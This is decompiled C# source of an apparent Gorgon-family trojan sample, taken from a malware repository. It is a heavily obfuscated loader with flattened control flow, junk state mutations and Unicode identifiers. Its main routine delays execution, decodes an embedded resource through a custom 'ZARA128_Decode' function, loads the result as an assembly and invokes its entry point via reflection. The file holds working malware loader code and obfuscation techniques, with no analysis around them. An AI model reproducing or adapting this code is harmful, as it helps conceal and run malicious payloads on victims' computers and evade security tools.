// Decompiled with JetBrains decompiler
// Type: xU.Class1
// Assembly: xU, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 15FBACA6-4EA1-48EF-94B8-EDBEAA61F9E6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-c4129b34223aa76d82149dfb9d96165a2c415edb79c4eb534239035bd98047de.exe

using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security;
using System.Text;
using xU.My;
using Ⴓ;

namespace xU
{
  public sealed class Class1
  {
    [SecuritySafeCritical]
    [STAThread]
    public static void Main()
    {
      xU.My.Resources.Resources.ႭႨ.Ⴃ();
      ((object) new Class1() as Class1).TESTO();
      MyApplication.Ⴄ[108] = (char) ((int) MyApplication.Ⴄ[108] * (int) MyApplication.Ⴄ[124] & 107);
    }

    public void TESTO()
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      int num1 = 0;
      Array ⴄ;
      int num2;
      object obj1;
      _MethodBase methodBase;
      object obj2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            num2 = 2;
            num1 = 8;
            continue;
          case 2:
            goto label_19;
          case 3:
          case 6:
            num2 = (int) (ⴄ as char[])[122] - 5347;
            goto case 11;
          case 4:
            ႷႷ.ႷႥ.ႷႨ.Ⴅ<MethodBase, object>((MethodBase) (methodBase as MethodBase as MethodInfo), ႷႷ.ႷႥ.ႷႨ.Ⴐ<object>(obj2, '̆', '̷'), (object[]) null, (short) 661, 'ˉ');
            num1 = 7;
            continue;
          case 5:
            MyComputer.ႭႭ.Ⴗ(10000, 'Ā', (short) 295);
            obj1 = (object) MyComputer.Ⴍ(this.ZARA128_Decode(xU.My.Resources.Resources.Ⴗ()), (short) 838, '͜');
            num1 = 1;
            continue;
          case 7:
            ႠႤ.Ⴍ[327] = (byte) ((int) ႠႤ.Ⴍ[327] + (int) ႠႤ.Ⴍ[436] & 94);
            num1 = 2;
            continue;
          case 8:
          case 10:
            int num3;
            switch (num2)
            {
              case 0:
                num3 = 5;
                break;
              case 1:
                num3 = 1;
                break;
              case 2:
                num3 = 9;
                break;
              case 3:
                num3 = (int) ⴅ[29] / 7;
                break;
              case 4:
                num3 = (int) ⴅ[38] - 181;
                break;
              case 5:
                num3 = 4;
                break;
              default:
                num3 = 5;
                break;
            }
            num1 = num3;
            continue;
          case 9:
            methodBase = (_MethodBase) MyComputer.ႭႭ.Ⴀ<Assembly>((Assembly) obj1, 262, 264);
            obj2 = ႷႷ.ႷႥ.ႷႨ.Ⴐ<object>(ႷႷ.Ⴀ<string, Assembly>((Assembly) obj1, MyComputer.ႷႥ<MemberInfo>((MemberInfo) ((MethodBase) methodBase as MethodInfo), (short) 200, '\u0088'), (short) 843, 848), 'Ƌ', 'ƺ');
            num1 = (int) ⴅ[147] - 6;
            continue;
          case 11:
            num1 = 8;
            continue;
          default:
            ⴄ = (Array) MyApplication.Ⴄ;
            num2 = 0;
            num1 = 8;
            continue;
        }
      }
label_19:;
    }

    public byte[] ZARA128_Decode(string input)
    {
      char[] ⴃ = MyApplication.Ⴃ;
      byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
      Array ⴄ = (Array) MyApplication.Ⴄ;
label_4:
      int num1 = 3;
      object obj1;
      while (true)
      {
        int num2;
        object obj2;
        ICollection collection;
        object obj3;
        int index;
        int num3;
        int num4;
        switch (num1)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Class1.ZARA128_Decode);
            num2 = 1;
            num1 = 11;
            continue;
          case 1:
label_35:
            num1 = 11;
            continue;
          case 2:
            checked { ++index; }
            num2 = 3;
            num1 = 11;
            continue;
          case 3:
            obj2 = (object) new StringBuilder();
            collection = (ICollection) MyComputer.ႭႭ.Ⴗ<string, string>(input, xU.My.Resources.Resources.ႭႨ.Ⴗ(901587162, 6, (string) null), -1, CompareMethod.Binary, 'ű', (short) 267);
            num1 = (int) ⴅ[99] - 28;
            continue;
          case 4:
            num2 = 9;
            num1 = 11;
            continue;
          case 5:
            goto label_3;
          case 6:
            num3 = checked ((int) MyComputer.ႷႷ(unchecked (Class1.Ⴃ<string>((string) ((object) (obj3 as string[])[index] as IConvertible), 614, 'ɰ') - 312.0), '́', 820));
            num1 = (int) ⴃ[311] - 54847;
            continue;
          case 7:
          case 9:
            obj1 = (object) ႷႠ.Ⴄ<string>(ႷႷ.Ⴐ<StringBuilder>((StringBuilder) obj2, 'É', '¬'), (short) 555, 618);
            num1 = 17;
            continue;
          case 8:
            num4 = 8;
            break;
          case 10:
            num2 = 5;
            num1 = (int) ⴃ[415] - 47691;
            continue;
          case 11:
            int num5;
            switch (num2)
            {
              case 0:
                num5 = 3;
                break;
              case 1:
                num5 = 3;
                break;
              case 2:
                num5 = 0;
                break;
              case 3:
                num5 = 14;
                break;
              case 4:
                num5 = 18;
                break;
              case 5:
                num5 = (int) ⴃ[275] - 3806;
                break;
              case 6:
                num5 = (int) ⴃ[24] - 16459;
                break;
              case 7:
                num5 = 6;
                break;
              case 8:
                num5 = 9;
                break;
              case 9:
                num5 = (int) ⴅ[225];
                break;
              case 10:
                num5 = 19;
                break;
              default:
                num5 = 0;
                break;
            }
            num1 = num5;
            continue;
          case 12:
            num4 = 7;
            break;
          case 13:
            num2 = (int) (ⴄ as char[])[291] - 57531;
            num1 = (int) ⴅ[198] - 233;
            continue;
          case 14:
            int num6;
            if (index >= ((string[]) obj3).Length)
              num6 = (int) ⴅ[186] - 130;
            else
              goto label_32;
label_31:
            num1 = num6;
            continue;
label_32:
            int num7 = (int) ⴃ[423];
            MyApplication.Ⴃ[148] = (char) (((int) MyApplication.Ⴃ[148] ^ (int) MyApplication.Ⴃ[19]) & 42);
            num6 = num7 - 30248;
            goto label_31;
          case 16:
            Class1.Ⴃ<StringBuilder>(obj2 as StringBuilder, xU.My.Resources.Resources.ႭႨ.Ⴀ(num3, 324, 'Ľ'), 583, (short) 559);
            num1 = 10;
            continue;
          case 17:
            goto label_38;
          case 18:
            obj3 = (object) (string[]) collection;
            num1 = (int) ⴅ[207] - 27;
            continue;
          case 19:
            index = 0;
            num2 = 3;
            num1 = 11;
            continue;
          case 20:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Class1.ZARA128_Decode);
            num1 = 5;
            continue;
        }
        num2 = num4;
        goto label_35;
      }
label_38:
      return (byte[]) obj1;
    }

    [SecuritySafeCritical]
    static Class1() => xU.My.Resources.Resources.ႭႨ.Ⴃ();

    [SecuritySafeCritical]
    internal static void Ⴅ<Ⴀ>([In] Ⴀ obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] short obj4, [In] short obj5) where Ⴀ : Stream
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
      int num1 = 12;
      while (true)
      {
        Array ⴍ;
        int num2;
        int num3;
        int num4;
        int num5;
        int num6;
        switch (num1)
        {
          case 0:
          case 3:
            ႷႷ.Ⴃ<Stream>((Stream) obj0, obj1, obj2, obj3, 'ʹ', '̵');
            goto case 9;
          case 1:
            num5 = (int) ((byte[]) ⴍ)[254] - 106;
            break;
          case 2:
            int num7;
            switch (num2)
            {
              case 0:
                num7 = (int) ⴅ[177] + (int) ⴅ[28];
                break;
              case 1:
                num7 = 3;
                break;
              case 2:
                num7 = 16;
                break;
              case 3:
                num7 = 14;
                break;
              case 4:
                num7 = (int) ⴅ[39];
                break;
              case 5:
                num7 = (int) ⴅ[125] - 34;
                break;
              case 6:
                num7 = 9;
                break;
              case 7:
                num7 = 9;
                break;
              case 8:
                num7 = (int) ⴃ[226] - 36745;
                break;
              case 9:
                num7 = (int) ⴃ[267] - 14689;
                break;
              default:
                num7 = 7;
                break;
            }
            num1 = num7;
            continue;
          case 4:
            num6 = 2;
            goto label_31;
          case 5:
            int num8 = (int) obj5;
            int num9 = num8 * num8;
            num4 = (int) obj5 + num9;
            num2 = 0;
            num1 = (int) ⴃ[346] - 15490;
            continue;
          case 6:
            goto label_33;
          case 7:
            num3 = 0;
            goto case 8;
          case 8:
            num2 = 2;
            num1 = 2;
            continue;
          case 9:
            int num10 = num3;
            MyApplication.Ⴄ[310] = (char) ((int) MyApplication.Ⴄ[310] + (int) MyApplication.Ⴄ[245] & 100);
            num3 = num10 + 1;
            num1 = (int) ⴃ[168] - 23648;
            continue;
          case 10:
            num5 = 4;
            break;
          case 11:
            num6 = (int) (ⴍ as byte[])[305] - 233;
            goto label_31;
          case 14:
            num2 = 7;
            num1 = (int) ⴃ[415] - 47700;
            continue;
          case 15:
            num1 = num4 % 2 != 0 ? (int) ⴅ[28] : (int) ⴃ[230] - 15486;
            continue;
          case 16:
            int num11;
            switch (((int) obj4 ^ (int) obj5) - 16 ^ num3)
            {
              case 0:
                num11 = 10;
                break;
              default:
                num11 = (int) ⴅ[214] - 110;
                break;
            }
            num1 = num11;
            continue;
          default:
            ⴍ = (Array) ႠႤ.Ⴍ;
            num2 = 9;
            num1 = (int) ⴅ[87] / 5;
            continue;
        }
        num2 = num5;
        num1 = 2;
        continue;
label_31:
        num2 = num6;
        num1 = 2;
      }
label_33:;
    }

    [SecuritySafeCritical]
    internal static string Ⴅ<Ⴈ>([In] Ⴈ obj0, [In] int obj1, [In] int obj2) where Ⴈ : Exception
    {
      char[] ⴃ = MyApplication.Ⴃ;
      byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
      object ⴄ = (object) MyApplication.Ⴄ;
      int num1 = 13;
      object obj;
      while (true)
      {
        int num2;
        int num3;
        int num4;
        int num5;
        switch (num1)
        {
          case 0:
            int num6;
            switch (num2)
            {
              case 0:
                num6 = 10;
                break;
              case 1:
                num6 = (int) ⴃ[192] - 38032;
                break;
              case 2:
                num6 = (int) ⴃ[271] - 59597;
                break;
              case 3:
                num6 = 11;
                break;
              case 4:
                num6 = 16;
                break;
              case 5:
                num6 = 4;
                break;
              case 6:
                num6 = 15;
                break;
              case 7:
                num6 = (int) ⴅ[177] + 2;
                break;
              case 8:
                num6 = 3;
                break;
              case 9:
                num6 = 11;
                break;
              case 10:
                num6 = (int) ⴃ[20] - 10518;
                break;
              default:
                num6 = 16;
                break;
            }
            num1 = num6;
            continue;
          case 1:
            int num7 = (int) (ⴄ as char[])[254];
            MyApplication.Ⴄ[282] = (char) ((int) MyApplication.Ⴄ[282] - obj1 & 101);
            num4 = num7 - 26475;
            break;
          case 2:
          case 7:
            goto label_3;
          case 3:
            goto label_33;
          case 4:
            num2 = 10;
            num1 = (int) ⴃ[382] - (int) ⴃ[382];
            continue;
          case 5:
            num5 = (int) (ⴄ as char[])[269] - 23443;
            goto label_31;
          case 6:
          case 14:
          case 15:
            obj = (object) ႷႷ.ႷႥ.Ⴀ<Exception>((Exception) obj0, (short) 966, 'ϖ');
            int num8 = (int) ((char[]) ⴄ)[337];
            MyApplication.Ⴃ[385] = (char) (((int) MyApplication.Ⴃ[385] | obj2) & 184);
            num2 = num8 - 14546;
            num1 = 0;
            continue;
          case 8:
            num5 = 10;
            goto label_31;
          case 10:
            obj = (object) null;
            num2 = (int) (ⴄ as char[])[203] - 5008;
            num1 = 0;
            continue;
          case 11:
            ++num3;
            num1 = 643 < 1286 / 2 - 247 ? 8 : 5;
            continue;
          case 12:
            int num9;
            switch ((obj2 ^ obj1) - 57 ^ num3)
            {
              case 0:
                num9 = 1;
                break;
              default:
                num9 = 17;
                break;
            }
            num1 = num9;
            continue;
          case 13:
            num3 = 0;
            num2 = 10;
            num1 = (int) ⴅ[7];
            continue;
          case 16:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Class1.Ⴅ);
            num2 = 7;
            num1 = 0;
            continue;
          case 17:
            num4 = 0;
            break;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Class1.Ⴅ);
            num1 = 7;
            continue;
        }
        num2 = num4;
        num1 = 0;
        continue;
label_31:
        num2 = num5;
        num1 = (int) ⴅ[7];
      }
label_33:
      return obj as string;
    }

    [SecuritySafeCritical]
    internal static double Ⴃ<Ⴃ>([In] Ⴃ obj0, [In] int obj1, [In] char obj2) where Ⴃ : string
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
label_3:
      Array ⴍ = (Array) ႠႤ.Ⴍ;
      Array ⴄ = (Array) MyApplication.Ⴄ;
      int num1 = 17;
      double num2;
      while (true)
      {
        int num3;
        int num4;
        int num5;
        int num6;
        int num7;
        int num8;
        switch (num1)
        {
          case 0:
            num7 = 3;
            break;
          case 1:
          case 10:
          case 11:
            num3 = 1;
            num1 = 6;
            continue;
          case 2:
            int num9;
            switch ((obj1 ^ (int) obj2) - 22 ^ num4)
            {
              case 0:
                num9 = (int) ⴃ[109] - 17305;
                break;
              default:
                num9 = (int) ⴃ[442] - 48189;
                break;
            }
            num1 = num9;
            continue;
          case 3:
            num2 = 0.22991711976713439;
            num3 = 5;
            num1 = 6;
            continue;
          case 4:
            num2 = ႷႠ.Ⴀ<string>((string) obj0, '͈', (short) 793);
            num3 = 5;
            num1 = (int) ⴃ[244] - 40161;
            continue;
          case 5:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Class1.Ⴃ);
            num3 = (int) (ⴍ as byte[])[574] - 186;
            num1 = (int) ⴅ[142] / 6;
            continue;
          case 6:
            int num10;
            switch (num3)
            {
              case 0:
                num10 = (int) ⴅ[29] - 55;
                break;
              case 1:
                num10 = (int) ⴃ[379] - 16436;
                break;
              case 2:
                num10 = (int) ⴅ[87];
                break;
              case 3:
                num10 = 3;
                break;
              case 4:
                num10 = (int) ⴃ[86] - 51950;
                break;
              case 5:
                num10 = (int) ⴃ[78] - 46582;
                break;
              case 6:
                num10 = 4;
                break;
              case 7:
                num10 = 17;
                break;
              case 8:
                num10 = (int) ⴅ[137] - 34;
                break;
              case 9:
                num10 = 19;
                break;
              case 10:
                num10 = (int) ⴃ[359] - 25957;
                break;
              case 11:
                num10 = 4;
                break;
              default:
                num10 = 5;
                break;
            }
            num1 = num10;
            continue;
          case 7:
            num1 = 2583 > num6 - num5 * 7 ? (int) ⴅ[34] - 142 : 16;
            continue;
          case 8:
            ++num4;
            num5 = 74;
            num6 = 369;
            num1 = 7;
            continue;
          case 9:
            num3 = 1;
            num1 = 6;
            continue;
          case 13:
            goto label_3;
          case 14:
            num1 = 6;
            continue;
          case 15:
            num8 = 9;
            goto label_34;
          case 16:
            num8 = (int) (ⴄ as char[])[261] - 63042;
            goto label_34;
          case 17:
            num4 = 0;
            int num11 = (int) (ⴍ as byte[])[379];
            ႠႤ.Ⴍ[609] = (byte) ((int) ႠႤ.Ⴍ[609] & obj1 & 39);
            num3 = num11 - 194;
            goto case 14;
          case 18:
            num7 = 11;
            break;
          case 19:
            goto label_37;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Class1.Ⴃ);
            num1 = (int) ⴅ[184] - 68;
            continue;
        }
        num3 = num7;
        num1 = (int) ⴅ[89] - 117;
        continue;
label_34:
        num3 = num8;
        num1 = 6;
      }
label_37:
      return num2;
    }

    [SecuritySafeCritical]
    internal static StringBuilder Ⴃ<Ⴍ>([In] Ⴍ obj0, [In] char obj1, [In] int obj2, [In] short obj3) where Ⴍ : StringBuilder
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
label_3:
      object ⴄ = (object) MyApplication.Ⴄ;
      object ⴍ = (object) ႠႤ.Ⴍ;
      int num1 = (int) ⴅ[26] / 6;
      object obj;
      while (true)
      {
        int num2;
        int num3;
        int num4;
        int num5;
        int num6;
        int num7;
        switch (num1)
        {
          case 0:
            ++num3;
            num1 = 17;
            continue;
          case 1:
            goto label_3;
          case 2:
          case 9:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Class1.Ⴃ);
            num2 = (int) ((char[]) ⴄ)[256] - 47089;
            num1 = 15;
            continue;
          case 4:
            int num8;
            switch ((obj2 ^ (int) obj3) - 104 ^ num3)
            {
              case 0:
                num8 = 13;
                break;
              default:
                num8 = 20;
                break;
            }
            num1 = num8;
            continue;
          case 5:
            obj = (object) null;
            num2 = (int) ((char[]) ⴄ)[88] - 60027;
            num1 = 15;
            continue;
          case 6:
          case 8:
            num2 = (int) ((byte[]) ⴍ)[337] - (int) (ⴍ as byte[])[94];
            num1 = 15;
            continue;
          case 7:
            num3 = 0;
            num2 = 0;
            num1 = 15;
            continue;
          case 10:
            goto label_38;
          case 11:
            num1 = (int) ⴃ[80] - 24216;
            continue;
          case 12:
            num2 = (int) ((char[]) ⴄ)[314] - 12895;
            goto case 11;
          case 13:
            num6 = 9;
            break;
          case 14:
            num7 = (int) ((char[]) ⴄ)[54] - 59942;
            goto label_34;
          case 15:
            int num9;
            switch (num2)
            {
              case 0:
                num9 = 4;
                break;
              case 1:
                num9 = (int) ⴅ[7];
                break;
              case 2:
                num9 = 7;
                break;
              case 3:
                num9 = 16;
                break;
              case 4:
                num9 = 8;
                break;
              case 5:
                num9 = (int) ⴅ[165] - 43;
                break;
              case 6:
                num9 = (int) ⴅ[87];
                break;
              case 7:
                num9 = 18;
                break;
              case 8:
                num9 = (int) ⴅ[107] - 196;
                break;
              case 9:
                num9 = 16;
                break;
              case 10:
                num9 = 17;
                break;
              case 11:
                num9 = 2;
                break;
              default:
                num9 = 2;
                break;
            }
            num1 = num9;
            continue;
          case 16:
            obj = (object) ႷႠ.ႷႤ.Ⴈ<StringBuilder>((StringBuilder) obj0, obj1, 751, (short) 685);
            num2 = 1;
            num1 = (int) ⴅ[39] * 5;
            continue;
          case 17:
            num4 = 153;
            num5 = 378;
            num1 = 18;
            continue;
          case 18:
            num1 = 1890 > num5 - num4 * 5 ? 14 : 19;
            continue;
          case 19:
            num7 = (int) (ⴄ as char[])[66] - 53513;
            goto label_34;
          case 20:
            num6 = 5;
            break;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Class1.Ⴃ);
            num1 = 1;
            continue;
        }
        num2 = num6;
        num1 = 15;
        continue;
label_34:
        num2 = num7;
        num1 = 15;
      }
label_38:
      return obj as ISerializable as StringBuilder;
    }
  }
}
